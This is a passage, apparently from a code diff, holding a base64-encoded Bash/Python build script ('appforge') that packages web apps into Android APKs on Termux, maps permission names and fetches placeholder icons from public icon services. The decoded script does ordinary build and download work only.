zFdIGluIFdFXQogICAgaWYgbm90IHdlOiBwcmludCgnICBOZW5odW0gYXJxdWl2byB3ZWIgZW5jb250cmFkbycpOyBzeXMuZXhpdCgwKQogICAgZm9yIGUgaW4gd2U6CiAgICAgICAgcmVsPWVbbGVuKHBmeCk6XQogICAgICAgIGlmIG5vdCByZWw6IGNvbnRpbnVlCiAgICAgICAgZGVzdD1vcy5wYXRoLmpvaW4ob3V0LHJlbCk7IG9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZShkZXN0KSxleGlzdF9vaz1UcnVlKQogICAgICAgIHdpdGggemYub3BlbihlKSBhcyBzLG9wZW4oZGVzdCwnd2InKSBhcyBkOiBkLndyaXRlKHMucmVhZCgpKQogICAgICAgIGV4dD1vcy5wYXRoLnNwbGl0ZXh0KHJlbC5sb3dlcigpKVsxXQogICAgICAgIGlmIGV4dCBpbignLmh0bWwnLCcuaHRtJyk6IGNbJ2h0bWwnXSs9MQogICAgICAgIGVsaWYgZXh0PT0nLmNzcyc6IGNbJ2NzcyddKz0xCiAgICAgICAgZWxpZiBleHQ9PScuanMnOiBjWydqcyddKz0xCiAgICAgICAgZWxzZTogY1snb3RoZXInXSs9MQpwcmludChmJyAgb2sge3N1bShjLnZhbHVlcygpKX0gYXJxdWl2b3MgKEhUTUw6e2NbImh0bWwiXX0gQ1NTOntjWyJjc3MiXX0gSlM6e2NbImpzIl19IE91dHJvczp7Y1sib3RoZXIiXX0pJykKUFlFT0YKICBfZGltICJSZWJ1aWxkOiBhcHBmb3JnZSBidWlsZCAnJE9VVF9ESVInIC0tbmFtZSBcIkFwcFwiIgogIHByaW50ZiAnXG4nCn0KY2FzZSAiJHsxOi1oZWxwfSIgaW4KICBidWlsZCkgICAgc2hpZnQ7IF9jbWRfYnVpbGQgICAgIiRAIiA7OwogIGFwazJ3ZWIpICBzaGlmdDsgX2NtZF9hcGsyd2ViICAiJEAiIDs7CiAgdGVtcGxhdGUpIHNoaWZ0OyBfY21kX3RlbXBsYXRlICIkQCIgOzsKICBjaGVjaykgICAgc2hpZnQ7IF9jbWRfY2hlY2sgICAgIiRAIiA7OwogIGljb24pICAgICBzaGlmdDsgX2NtZF9pY29uICAgICAiJEAiIDs7CiAgbWFufC0tbWFuKSAgICAgIF9jbWRfbWFuICA7OwogIGhlbHB8LS1oZWxwfC1oKSBfY21kX2hlbHAgOzsKICAqKSBpZiBbIC1mICIkMSIgXSAmJiBwcmludGYgJyVzJyAiJDEiIHwgZ3JlcCAtcWkgJ1wuYXBrJCc7IHRoZW4gX2NtZF9hcGsyd2ViICIkQCIKICAgICBlbGlmIFsgLWQgIiQxIiBdIHx8IFsgIiQxIiA9ICctLXVybCcgXTsgdGhlbiBfY21kX2J1aWxkICIkQCIKICAgICBlbHNlIF9jbWRfaGVscDsgZmkgOzsKZXNhYwo='
+script_b64 = 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIGFwcGZvcmdlIC0tIEVsbGlvdE9TIEhUTUwvQ1NTL0pTIC0+IEFQSwpWRVJTSU9OPScxLjMuMCcKUFJFRklYPSIke1BSRUZJWDotL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzcn0iClcyQV9IT01FPSIkSE9NRS8ueHBtL2FwcGZvcmdlIgpXMkFfSkFSPSIkVzJBX0hPTUUvYW5kcm9pZC5qYXIiClcyQV9LUz0iJEhPTUUvLnhwbS90b29scy9hcGt0b29sL3hwbS1jb21wYXQtdGVzdC5rZXlzdG9yZSIKWyAtZiAiJFcyQV9LUyIgXSB8fCBXMkFfS1M9IiRXMkFfSE9NRS9hcHBmb3JnZS5rZXlzdG9yZSIKX29rKCkgICB7IHByaW50ZiAnXDAzM1sxOzMybSAgb2sgJXNcMDMzWzBtXG4nICAiJDEiOyB9Cl9pbmZvKCkgeyBwcmludGYgJ1wwMzNbMTszNm0gIC0+ICVzXDAzM1swbVxuJyAgIiQxIjsgfQpfd2FybigpIHsgcHJpbnRmICdcMDMzWzE7MzNtICAhICAlc1wwMzNbMG1cbicgICIkMSI7IH0KX2VycigpICB7IHByaW50ZiAnXDAzM1sxOzMxbSAgWCAgJXNcMDMzWzBtXG4nICIkMSIgPiYyOyBleGl0IDE7IH0KX2hlYWQoKSB7IHByaW50ZiAnXG5cMDMzWzE7MzVtICA9PSAlcyA9PVwwMzNbMG1cbicgIiQxIjsgfQpfZGltKCkgIHsgcHJpbnRmICdcMDMzWzA7OTBtICAlc1wwMzNbMG1cbicgIiQxIjsgfQpfcGVybV9yZXNvbHZlKCkgewogIGxvY2FsIHAKICBmb3IgcCBpbiAkKHByaW50ZiAnJXMnICIkMSIgfCB0ciAnLCcgJyAnKTsgZG8KICAgIGNhc2UgIiQocHJpbnRmICclcycgIiRwIiB8IHRyICdBLVonICdhLXonIHwgdHIgLWQgJyAnKSIgaW4KICAgICAgaW50ZXJuZXR8bmV0fG5ldHdvcmspICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5JTlRFUk5FVCcgOzsKICAgICAgY2FtZXJhfHdlYmNhbXxjYW0pICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5DQU1FUkEnIDs7CiAgICAgIG1pY3xtaWNyb3Bob25lfGF1ZGlvfHJlY29yZCkgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ09SRF9BVURJTycgOzsKICAgICAgc3RvcmFnZXxhcmNoaXZlc3xmaWxlc3xzZGNhcmQpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTUFOQUdFX0VYVEVSTkFMX1NUT1JBR0UnIDs7CiAgICAgIGxvY2F0aW9ufGdwc3xnZW8pCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkFDQ0VTU19GSU5FX0xPQ0FUSU9OJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5BQ0NFU1NfQ09BUlNFX0xPQ0FUSU9OJyA7OwogICAgICB2aWJyYXRlfHZpYnJhdGlvbikgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlZJQlJBVEUnIDs7CiAgICAgIGJsdWV0b290aHxidCkKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5CTFVFVE9PVEhfQ09OTkVDVCcKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIX1NDQU4nIDs7CiAgICAgIG5mYykgICAgICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTkZDJyA7OwogICAgICBjb250YWN0cykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUkVBRF9DT05UQUNUUycKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfQ09OVEFDVFMnIDs7CiAgICAgIHBob25lfGNhbGwpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkNBTExfUEhPTkUnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfUEhPTkVfU1RBVEUnIDs7CiAgICAgIHNtcykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uU0VORF9TTVMnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ0VJVkVfU01TJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5SRUFEX1NNUycgOzsKICAgICAgd2FrZXx3YWtlbG9jaykgICAgICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5XQUtFX0xPQ0snIDs7CiAgICAgIG5vdGlmaWNhdGlvbnN8bm90aWYpICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUE9TVF9OT1RJRklDQVRJT05TJyA7OwogICAgICBmbGFzaGxpZ2h0fHRvcmNoKSAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkZMQVNITElHSFQnIDs7CiAgICAgIHNlbnNvcnMpICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQk9EWV9TRU5TT1JTJyA7OwogICAgICAqKSAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJHAiIDs7CiAgICBlc2FjCiAgZG9uZQp9Cl9nZW5faWNvbigpIHsKICBsb2NhbCBkc3Q9IiQxIiBzej0iJHsyOi0xOTJ9IgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3RydWN0LHpsaWIKZHN0LHN6PSckZHN0JyxpbnQoJyRzeicgaWYgJyRzeicgZWxzZSAnMTkyJykKcixnLGI9MjYsMTE1LDIzMgpkZWYgY2h1bmsobixkKToKIGM9emxpYi5jcmMzMihuK2QpJjB4ZmZmZmZmZmYKIHJldHVybiBzdHJ1Y3QucGFjaygnPkknLGxlbihkKSkrbitkK3N0cnVjdC5wYWNrKCc+SScsYykKcmF3PWInJwpmb3IgXyBpbiByYW5nZShzeik6IHJhdys9YidceDAwJytieXRlcyhbcixnLGIsMjU1XSpzeikKcG5nPWInXHg4OVBOR1xyXG5ceDFhXG4nK2NodW5rKGInSUhEUicsc3RydWN0LnBhY2soJz5JSUJCQkJCJyxzeixzeiw4LDYsMCwwLDApKStjaHVuayhiJ0lEQVQnLHpsaWIuY29tcHJlc3MocmF3LDYpKStjaHVuayhiJ0lFTkQnLGInJykKb3Blbihkc3QsJ3diJykud3JpdGUocG5nKQoiIDI+L2Rldi9udWxsCn0KX3Jlc2l6ZV9pY29uKCkgewogIGxvY2FsIHNyYz0iJDEiIGRzdD0iJDIiIHN6PSIkMyIKICBta2RpciAtcCAiJChkaXJuYW1lICIkZHN0IikiCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsc2h1dGlsCnRyeToKIGZyb20gUElMIGltcG9ydCBJbWFnZQogSW1hZ2Uub3BlbignJHNyYycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJHN6JyksaW50KCckc3onKSksSW1hZ2UuTEFOQ1pPUykuc2F2ZSgnJGRzdCcpCmV4Y2VwdDogc2h1dGlsLmNvcHkoJyRzcmMnLCckZHN0JykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJHNyYyIgIiRkc3QiCn0KX2Vuc3VyZV9rZXlzdG9yZSgpIHsKICBbIC1mICIkVzJBX0tTIiBdICYmIHJldHVybgogIF9pbmZvICdHZXJhbmRvIGtleXN0b3JlLi4uJwogIG1rZGlyIC1wICIkKGRpcm5hbWUgIiRXMkFfS1MiKSIKICBrZXl0b29sIC1nZW5rZXlwYWlyIC12IC1rZXlzdG9yZSAiJFcyQV9LUyIgLWFsaWFzIGFwcGZvcmdlIC1rZXlhbGcgRUMgLWtleXNpemUgMjU2IC12YWxpZGl0eSAxMDAwMCAtc3RvcmVwYXNzIGFwcGZvcmdlLWtleSAta2V5cGFzcyBhcHBmb3JnZS1rZXkgLWRuYW1lICdDTj1hcHBmb3JnZSwgTz1FbGxpb3RPUywgQz1CUicgMj4vZGV2L251bGwgJiYgX29rICdLZXlzdG9yZSBjcmlhZGEnCn0KX0lDT05fVElNR19CQVNFPSIkSE9NRS8ueHBtL3RpbWctdG1wIgpfaWNvbl9ta3RlbXBfZGlyKCkgewogIGxvY2FsIElEOyBJRD0iJChkYXRlICslWSVtJWRfJUglTSVTKSQkIgogIGxvY2FsIERJUj0iJF9JQ09OX1RJTUdfQkFTRS8kSUQiCiAgbWtkaXIgLXAgIiRESVIiIDI+L2Rldi9udWxsIHx8IHJldHVybiAxCiAgcHJpbnRmICclcycgIiRESVIiCn0KX2ljb25fY2hlY2tfbmV0KCkgewogICMgY3VybCB0ZW0gcHJpb3JpZGFkZSDigJQgw6kgbyBxdWUgc2FiZW1vcyBmdW5jaW9uYXIgbm8gVGVybXV4CiAgaWYgY29tbWFuZCAtdiBjdXJsID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgY3VybCAtZnNTTCAtLW1heC10aW1lIDUgXAogICAgICAgICAtQSAnQXBwRm9yZ2UvMS4zJyBcCiAgICAgICAgICdodHRwczovL3d3dy5nb29nbGUuY29tL2dlbmVyYXRlXzIwNCcgXAogICAgICAgICAtbyAvZGV2L251bGwgMj4vZGV2L251bGwKICAgIHJldHVybiAkPwogIGZpCiAgIyBGYWxsYmFjayB1cmxsaWIg4oaSIG1lc21vIGVuZHBvaW50IGRlIGNvbmVjdGl2aWRhZGUgZG8gQW5kcm9pZAogIHB5dGhvbjMgLWMgIgppbXBvcnQgdXJsbGliLnJlcXVlc3QsIHN5cwpmb3IgdXJsIGluIFsnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9nZW5lcmF0ZV8yMDQnLAogICAgICAgICAgICAnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zMi9mYXZpY29ucz9kb21haW49Z29vZ2xlLmNvbSZzej0xNicsCiAgICAgICAgICAgICdodHRwOi8vY29ubmVjdGl2aXR5Y2hlY2suZ3N0YXRpYy5jb20vZ2VuZXJhdGVfMjA0J106CiAgICB0cnk6CiAgICAgICAgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9eydVc2VyLUFnZW50JzonQXBwRm9yZ2UvMS4zJ30pCiAgICAgICAgdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD01KQogICAgICAgIHN5cy5leGl0KDApCiAgICBleGNlcHQ6IHBhc3MKc3lzLmV4aXQoMSkKIiAyPi9kZXYvbnVsbAp9Cl9pY29uX2ZldGNoX3VybCgpIHsKICBsb2NhbCBVUkw9IiQxIiBEU1Q9IiQyIiBUSU1FT1VUPSIkezM6LTE1fSIKICBpZiBjb21tYW5kIC12IGN1cmwgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICBjdXJsIC1mc1NMIC0tbWF4LXRpbWUgIiRUSU1FT1VUIiBcCiAgICAgICAgIC1BICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTIpIEFwcEZvcmdlLzEuMycgXAogICAgICAgICAtbyAiJERTVCIgIiRVUkwiIDI+L2Rldi9udWxsCiAgICBpZiBbIC1mICIkRFNUIiBdICYmIFsgIiQod2MgLWMgPCAiJERTVCIpIiAtZ3QgNjQgXTsgdGhlbgogICAgICByZXR1cm4gMAogICAgZmkKICAgIHJtIC1mICIkRFNUIgogIGZpCiAgcHl0aG9uMyAtYyAiCmltcG9ydCB1cmxsaWIucmVxdWVzdCwgc3lzCnVybD0nJFVSTCc7IGRzdD0nJERTVCcKaGRycz17J1VzZXItQWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTIpIEFwcEZvcmdlLzEuMycsCiAgICAgICdBY2NlcHQnOicqLyonLCdBY2NlcHQtTGFuZ3VhZ2UnOidlbi1VUyxlbjtxPTAuOSd9CnRyeToKICAgIHJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHVybCxoZWFkZXJzPWhkcnMpCiAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9JFRJTUVPVVQpIGFzIHI6CiAgICAgICAgZGF0YT1yLnJlYWQoKQogICAgaWYgbGVuKGRhdGEpPDY0OiBzeXMuZXhpdCgxKQogICAgb3Blbihkc3QsJ3diJykud3JpdGUoZGF0YSk7IHN5cy5leGl0KDApCmV4Y2VwdDogc3lzLmV4aXQoMSkKIiAyPi9kZXYvbnVsbAp9Cl9pY29uX2RldGVjdF9mb3JtYXQoKSB7CiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zCmY9JyQxJwppZiBub3Qgb3MucGF0aC5pc2ZpbGUoZikgb3Igb3MucGF0aC5nZXRzaXplKGYpPDMyOgogICAgcHJpbnQoJ3Vua25vd24nKTsgc3lzLmV4aXQoMSkKaD1vcGVuKGYsJ3JiJykucmVhZCgxNikKcmF3NTEyPW9wZW4oZiwncmInKS5yZWFkKDUxMikKaWYgaFs6NF09PWInXHg4OVBORyc6IHByaW50KCdwbmcnKTsgc3lzLmV4aXQoMCkKaWYgaFs6Ml09PWInXHhmZlx4ZDgnOiBwcmludCgnanBlZycpOyBzeXMuZXhpdCgwKQppZiBoWzo0XT09YidSSUZGJyBhbmQgaFs4OjEyXT09YidXRUJQJzogcHJpbnQoJ3dlYnAnKTsgc3lzLmV4aXQoMCkKaWYgaFs6M109PWInR0lGJzogcHJpbnQoJ2dpZicpOyBzeXMuZXhpdCgwKQppZiBiJzxzdmcnIGluIHJhdzUxMiBvciBiJzxTVkcnIGluIHJhdzUxMjogcHJpbnQoJ3N2ZycpOyBzeXMuZXhpdCgwKQpwcmludCgndW5rbm93bicpOyBzeXMuZXhpdCgxKQoiIDI+L2Rldi9udWxsCn0KX2ljb25fc3ZnX3RvX3BuZygpIHsKICBsb2NhbCBTVkc9IiQxIiBQTkc9IiQyIiBTSVpFPSIkezM6LTE5Mn0iCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zLCBzdWJwcm9jZXNzCnN2Zz0nJFNWRyc7IHBuZz0nJFBORyc7IHN6PWludCgnJFNJWkUnKQpkZWYgcnVuKCpjbWQpOgogICAgdHJ5OgogICAgICAgIHI9c3VicHJvY2Vzcy5ydW4obGlzdChjbWQpLGNhcHR1cmVfb3V0cHV0PVRydWUsdGltZW91dD0xNSkKICAgICAgICByZXR1cm4gci5yZXR1cm5jb2RlPT0wIGFuZCBvcy5wYXRoLmlzZmlsZShwbmcpIGFuZCBvcy5wYXRoLmdldHNpemUocG5nKT4xMDAKICAgIGV4Y2VwdDogcmV0dXJuIEZhbHNlCnRyeToKICAgIGZyb20gY2Fpcm9zdmcgaW1wb3J0IHN2ZzJwbmcKICAgIHN2ZzJwbmcoYnl0ZXN0cmluZz1vcGVuKHN2ZywncmInKS5yZWFkKCksd3JpdGVfdG89cG5nLG91dHB1dF93aWR0aD1zeixvdXRwdXRfaGVpZ2h0PXN6KQogICAgaWYgb3MucGF0aC5pc2ZpbGUocG5nKSBhbmQgb3MucGF0aC5nZXRzaXplKHBuZyk+MTAwOiBzeXMuZXhpdCgwKQpleGNlcHQ6IHBhc3MKaWYgcnVuKCdyc3ZnLWNvbnZlcnQnLCctdycsc3RyKHN6KSwnLWgnLHN0cihzeiksJy1vJyxwbmcsc3ZnKTogc3lzLmV4aXQoMCkKaWYgcnVuKCdpbmtzY2FwZScsJy0tZXhwb3J0LWZpbGVuYW1lPScrcG5nLCctLWV4cG9ydC13aWR0aD0nK3N0cihzeiksJy0tZXhwb3J0LWhlaWdodD0nK3N0cihzeiksc3ZnKTogc3lzLmV4aXQoMCkKaWYgcnVuKCdjb252ZXJ0JywnLWJhY2tncm91bmQnLCdub25lJywnLXJlc2l6ZScsc3RyKHN6KSsneCcrc3RyKHN6KSxzdmcscG5nKTogc3lzLmV4aXQoMCkKdHJ5OgogICAgZnJvbSBzdmdsaWIuc3ZnbGliIGltcG9ydCBzdmcycmxnCiAgICBmcm9tIHJlcG9ydGxhYi5ncmFwaGljcyBpbXBvcnQgcmVuZGVyUE0KICAgIGQ9c3ZnMnJsZyhzdmcpCiAgICBpZiBkOiByZW5kZXJQTS5kcmF3VG9GaWxlKGQscG5nLGZtdD0nUE5HJyk7IHN5cy5leGl0KDApCmV4Y2VwdDogcGFzcwpzeXMuZXhpdCgyKQoiIDI+L2Rldi9udWxsCiAgcmV0dXJuICQ/Cn0KX2ljb25fdG9fcG5nKCkgewogIGxvY2FsIFNSQz0iJDEiIERTVD0iJDIiIFNJWkU9IiR7MzotMTkyfSIKICBsb2NhbCBGTVQ7IEZNVD0kKF9pY29uX2RldGVjdF9mb3JtYXQgIiRTUkMiKQogIGNhc2UgIiRGTVQiIGluCiAgICBwbmd8anBlZ3x3ZWJwfGdpZikKICAgICAgcHl0aG9uMyAtYyAiCnRyeToKICAgIGZyb20gUElMIGltcG9ydCBJbWFnZQogICAgSW1hZ2Uub3BlbignJFNSQycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJFNJWkUnKSxpbnQoJyRTSVpFJykpKS5zYXZlKCckRFNUJykKZXhjZXB0OgogICAgaW1wb3J0IHNodXRpbDsgc2h1dGlsLmNvcHkoJyRTUkMnLCckRFNUJykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJFNSQyIgIiREU1QiIDs7CiAgICBzdmcpCiAgICAgIGlmICEgX2ljb25fc3ZnX3RvX3BuZyAiJFNSQyIgIiREU1QiICIkU0laRSI7IHRoZW4KICAgICAgICBfd2FybiAnU1ZHIG5hbyBjb252ZXJ0aWRvIOKAlCB1c2FuZG8gcGxhY2Vob2xkZXInCiAgICAgICAgX2dlbl9pY29uICIkRFNUIiAiJFNJWkUiCiAgICAgIGZpIDs7CiAgICAqKQogICAgICBweXRob24zIC1jICIKdHJ5OgogICAgZnJvbSBQSUwgaW1wb3J0IEltYWdlOyBJbWFnZS5vcGVuKCckU1JDJykuY29udmVydCgnUkdCQScpLnNhdmUoJyREU1QnKQpleGNlcHQ6IGltcG9ydCBzaHV0aWw7IHNodXRpbC5jb3B5KCckU1JDJywnJERTVCcpCiIgMj4vZGV2L251bGwgfHwgY3AgIiRTUkMiICIkRFNUIiA7OwogIGVzYWMKICBbIC1mICIkRFNUIiBdICYmIFsgIiQod2MgLWMgPCAiJERTVCIpIiAtZ3QgNjQgXQp9Cl9pY29uX3NlYXJjaF9wbmdfc291cmNlcygpIHsKICBsb2NhbCBURVJNPSIkMSIgVE1QRElSPSIkMiIgTUFYPSIkezM6LTV9IiBPRkZTRVQ9IiR7NDotMH0iCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsIG9zLCBzdWJwcm9jZXNzCkhEUj0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyKSBBcHBGb3JnZS8xLjMnCnRlcm09JyRURVJNJzsgdG1wZGlyPSckVE1QRElSJzsgbXg9aW50KCckTUFYJyk7IG9mZnNldD1pbnQoJyRPRkZTRVQnKQoKcmF3PXRlcm0ubG93ZXIoKS5zdHJpcCgpCnNsdWc9Jycuam9pbihjIGZvciBjIGluIHJhdyBpZiBjLmlzYWxudW0oKSBvciBjPT0nLScpLnN0cmlwKCctJykKc2x1Z19uaT1zbHVnLnJlcGxhY2UoJy0nLCcnKQppZiBub3Qgc2x1Zzogc3lzLmV4aXQoMSkKCmRlZiBmZXRjaCh1cmwsIGRzdCk6CiAgICB0cnk6CiAgICAgICAgcj1zdWJwcm9jZXNzLnJ1bihbJ2N1cmwnLCctZnNTTCcsJy0tbWF4LXRpbWUnLCc4JywKICAgICAgICAgICAgJy1BJyxIRFIsJy1vJyxkc3QsdXJsXSxjYXB0dXJlX291dHB1dD1UcnVlLHRpbWVvdXQ9MTApCiAgICAgICAgaWYgci5yZXR1cm5jb2RlPT0wIGFuZCBvcy5wYXRoLmlzZmlsZShkc3QpIGFuZCBvcy5wYXRoLmdldHNpemUoZHN0KT4zMDA6CiAgICAgICAgICAgIGg9b3Blbihkc3QsJ3JiJykucmVhZCgxNikKICAgICAgICAgICAgaWYgKGhbOjRdPT1iJ1x4ODlQTkcnIG9yIGhbOjJdPT1iJ1x4ZmZceGQ4JyBvcgogICAgICAgICAgICAgICAgaFs6NF09PWInUklGRicgb3IgaFs6NF0gaW4gKGInXHgwMFx4MDBceDAxXHgwMCcsYidceDAwXHgwMFx4MDJceDAwJykgb3IKICAgICAgICAgICAgICAgIGhbOjZdIGluIChiJ0dJRjg3YScsYidHSUY4OWEnKSk6CiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKGRzdCk6IG9zLnVubGluayhkc3QpCiAgICBleGNlcHQ6IHBhc3MKICAgIHJldHVybiBGYWxzZQoKIyB+NDAgZm9udGVzIOKAlCBnYXJhbnRlIHF1ZSAnbScgc2VtcHJlIHRlbSBtYWlzIHBhcmEgdGVudGFyCnNvdXJjZXM9WwogICAgIyBJY29uczg6IHNsdWcgbm9ybWFsLCB2YXJpb3MgZXN0aWxvcwogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2NvbG9yLzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2ZsdWVuY3kvOTYve3NsdWd9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vaW9zLWZpbGxlZC85Ni97c2x1Z30ucG5nJywKICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9kdXNrLzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL3N0aWNrZXJzLzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL25vbGFuLzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2dyYWRpZW50Lzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL29mZmljZWwvOTYve3NsdWd9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vcGxhc3RpY2luZS85Ni97c2x1Z30ucG5nJywKICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9lbW9qaS85Ni97c2x1Z30ucG5nJywKICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9mbGF0LXJvdW5kLzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL3VsdHJhdmlvbGV0Lzk2L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL21hdGVyaWFsLXJvdW5kZWQvOTYve3NsdWd9LnBuZycsCiAgICAjIEljb25zODogc2x1ZyBzZW0gaGlmZW4KICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9jb2xvci85Ni97c2x1Z19uaX0ucG5nJywKICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9mbHVlbmN5Lzk2L3tzbHVnX25pfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2R1c2svOTYve3NsdWdfbml9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vbm9sYW4vOTYve3NsdWdfbml9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vc3RpY2tlcnMvOTYve3NsdWdfbml9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vZ3JhZGllbnQvOTYve3NsdWdfbml9LnBuZycsCiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vb2ZmaWNlbC85Ni97c2x1Z19uaX0ucG5nJywKICAgIGYnaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS9wbGFzdGljaW5lLzk2L3tzbHVnX25pfS5wbmcnLAogICAgIyBJY29uczg6IHRhbWFuaG8gMTI4CiAgICBmJ2h0dHBzOi8vaW1nLmljb25zOC5jb20vY29sb3IvMTI4L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2ZsdWVuY3kvMTI4L3tzbHVnfS5wbmcnLAogICAgZidodHRwczovL2ltZy5pY29uczguY29tL2NvbG9yLzEyOC97c2x1Z19uaX0ucG5nJywKICAgICMgRmF2aWNvbnMgcG9yIGRvbWluaW8gKC5jb20pCiAgICBmJ2h0dHBzOi8vdDMuZ3N0YXRpYy5jb20vZmF2aWNvblYyP2NsaWVudD1TT0NJQUwmdHlwZT1GQVZJQ09OJmZhbGxiYWNrX29wdHM9VFlQRSxTSVpFLFVSTCZ1cmw9aHR0cHM6Ly97c2x1Z30uY29tJnNpemU9MjU2JywKICAgIGYnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zMi9mYXZpY29ucz9kb21haW49e3NsdWd9LmNvbSZzej0xMjgnLAogICAgZidodHRwczovL2Zhdmljb24uaW0ve3NsdWd9LmNvbT9sYXJnZXI9dHJ1ZScsCiAgICBmJ2h0dHBzOi8vaWNvbnMuZHVja2R1Y2tnby5jb20vaXAzL3tzbHVnfS5jb20uaWNvJywKICAgIGYnaHR0cHM6Ly9pY29uLmhvcnNlL2ljb24ve3NsdWd9LmNvbScsCiAgICAjIFRMRHMgYWx0ZXJuYXRpdm9zCiAgICBmJ2h0dHBzOi8vdDMuZ3N0YXRpYy5jb20vZmF2aWNvblYyP2NsaWVudD1TT0NJQUwmdHlwZT1GQVZJQ09OJmZhbGxiYWNrX29wdHM9VFlQRSxTSVpFLFVSTCZ1cmw9aHR0cHM6Ly97c2x1Z30uaW8mc2l6ZT0yNTYnLAogICAgZidodHRwczovL2Zhdmljb24uaW0ve3NsdWd9LmlvP2xhcmdlcj10cnVlJywKICAgIGYnaHR0cHM6Ly9pY29uLmhvcnNlL2ljb24ve3NsdWd9LmlvJywKICAgIGYnaHR0cHM6Ly90My5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnVybD1odHRwczovL3tzbHVnfS5vcmcmc2l6ZT0yNTYnLAogICAgZidodHRwczovL2Zhdmljb24u